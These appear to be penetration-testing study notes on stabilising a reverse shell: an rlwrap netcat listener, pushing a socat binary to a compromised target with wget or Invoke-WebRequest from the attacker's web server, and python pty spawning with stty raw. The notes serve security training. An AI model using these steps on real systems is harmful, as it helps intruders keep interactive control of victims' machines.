## Shell Stabilization

### rlwrap

**rlwrap** is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

```
rlwrap nc -lvnp <port>
```

Prepending our netcat listener with `rlwrap` gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by backgrounding the shell with Ctrl+Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### Stabilizing with Socat

Another way to stabilize a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`).
 
### Stabilizing a Linux Shell

- `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl+C will kill the shell.
- `export TERM=xterm` will give us access to term commands such as `clear`.
- background the shell using Ctrl+Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl+C to kill processes). It then foregrounds the shell, thus completing the process.
- Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.
